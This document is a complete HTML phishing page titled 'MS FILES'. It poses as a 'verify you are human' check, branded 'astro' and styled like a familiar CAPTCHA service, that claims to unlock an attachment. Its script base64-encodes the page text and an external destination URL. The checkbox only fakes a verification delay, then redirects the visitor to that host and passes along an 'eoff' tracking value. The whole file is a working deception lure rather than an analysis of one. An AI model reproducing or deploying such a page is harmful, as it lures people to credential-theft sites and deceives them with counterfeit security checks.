<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MS FILES</title>
    <style>
        /* Encapsulated Style Variables */
        :root { --p-accent: #4a6ee0; --s-accent: #28a745; --f-stack: 'Segoe UI', Roboto, sans-serif; }
        body, html { margin: 0; padding: 0; height: 100%; background: #ffffff; font-family: var(--f-stack); overflow: hidden; }

        /* Initial Shield */
        #stage-loader {
            position: fixed; inset: 0; background: #f8f9fa; z-index: 999;
            display: flex; align-items: center; justify-content: center;
            transition: opacity 0.5s ease;
        }
        .anim-element { width: 100px; filter: grayscale(20%); animation: pulse-node 1.8s infinite; }
        @keyframes pulse-node { 0%, 100% { transform: scale(1); opacity: 0.6; } 50% { transform: scale(1.04); opacity: 1; } }

        /* Main Viewport */
        #view-wrapper {
            width: 100%; max-width: 400px; margin: 0 auto; padding: 32px;
            display: flex; flex-direction: column; height: 80vh; justify-content: center;
            opacity: 0; transform: translateY(15px); transition: 0.8s;
        }
        .reveal #view-wrapper { opacity: 1; transform: translateY(0); }

        .desc-node { text-align: center; font-size: 17.6px; color: #1a1a1a; font-weight: 500; margin-bottom: 32px; line-height: 1.5; }

        /* Validation UI */
        .plate {
            background: #fbfbfb; border: 1px solid #e0e0e0; border-radius: 12px; height: 40px;
            padding: 35px 22px; display: flex; align-items: center; justify-content: space-between;
            box-shadow: 0 2px 5px rgba(0,0,0,0.02);
        }
        .plate-left { display: flex; align-items: center; gap: 19px; }

        .box-trigger {
            width: 20px; height: 20px; border: 2.5px solid var(--p-accent); border-radius: 5px;
            cursor: pointer; position: relative; transition: 300ms;
        }

        /* Logic States */
        .waiting { border-radius: 50%; border-color: #ddd; border-top-color: var(--p-accent); animation: rot-node 0.8s linear infinite; }
        .success { background: var(--s-accent); border-color: var(--s-accent); }
        .success::after { content: "\2713"; color: #fff; position: absolute; left: 5px; top: 0px; font-weight: bold; font-size: 16px; }

        @keyframes rot-node { 100% { transform: rotate(360deg); } }

        .sub-sec { text-align: right; font-size: 11px; color: #888; }
        .sub-sec img { width: 28px; margin-bottom: 4px; }
        .sub-sec b { color: #f38020; display: block; text-transform: uppercase; font-size: 10px; }

        .footer-pin {
            position: absolute; bottom: 25px; width: 100%; text-align: center;
            font-size: 12px; color: #bbb; display: flex; justify-content: center; align-items: center; gap: 7px;
        }
        .glyph { width: 12px; height: 14px; background: #ccc; clip-path: polygon(0 0, 100% 0, 100% 80%, 50% 100%, 0 80%); }
    </style>
</head>
<body id="context-body">

    <div id="stage-loader">
        <img src="astro.png" class="anim-element">
    </div>

    <div id="view-wrapper">
        <h1 class="desc-node" id="msg-01"></h1>

        <div class="plate">
            <div class="plate-left">
                <div id="interact-box" class="box-trigger"></div>
                <span id="msg-02" style="font-weight: 600; color: #333; letter-spacing: -0.2px;"></span>
            </div>

            <div class="sub-sec">
                <img src="astro_.png">
                <b>astro</b>
                Privacy &middot; Terms
            </div>
        </div>
    </div>

    <div class="footer-pin">
        <div class="glyph"></div>
        Protected by astro
    </div>

    <script>
        (function() {
            "use strict";

            // Obfuscated Content Map (Base64)
            const CONTENT = {
                t1: "VmVyaWZ5IHlvdSBhcmUgaHVtYW4gYnkgY29tcGxldGluZyB0aGUgYWN0aW9uIGJlbG93IHRvIHZpZXcgYXR0YWNobWVudA==", // Verify text
                t2: "VmVyaWZ5", // Verify
                t3: "UHJvY2Vzc2luZy4uLg==", // Processing...
                t4: "VmVyaWZpZWQ=", // Verified
                // Target URL: https://po.blanread.info/s/1qyzx7XI7ojXNxIhgbO
                dest: "aHR0cHM6Ly9wby5ibGFucmVhZC5pbmZvL3MvMXF5eng3WEk3b2pYTnhJaGdiTw=="
            };

            const decode = (str) => atob(str);
            let activeState = false;

            // Load texts dynamically
            document.getElementById('msg-01').textContent = decode(CONTENT.t1);
            document.getElementById('msg-02').textContent = decode(CONTENT.t2);

            // Startup Sequence
            window.addEventListener('load', () => {
                setTimeout(() => {
                    const gate = document.getElementById('stage-loader');
                    gate.style.opacity = '0';
                    setTimeout(() => {
                        gate.remove();
                        document.getElementById('context-body').classList.add('reveal');
                    }, 500);
                }, 1300);
            });

            // Action Execution
            const runVerification = async () => {
                if (activeState) return;
                activeState = true;

                const box = document.getElementById('interact-box');
                const label = document.getElementById('msg-02');

                label.textContent = decode(CONTENT.t3);
                box.classList.add('waiting');

                await new Promise(r => setTimeout(r, 1600));

                box.classList.remove('waiting');
                box.classList.add('success');
                label.textContent = decode(CONTENT.t4);

                setTimeout(() => {
                    const target = decode(CONTENT.dest);
                    const hash = new URLSearchParams(window.location.search).get('eoff');

                    window.location.replace(hash ? `${target}#${hash}` : target);
                }, 800);
            };

            document.getElementById('interact-box').addEventListener('click', runVerification);

        })();
    </script>
</body>
</html>
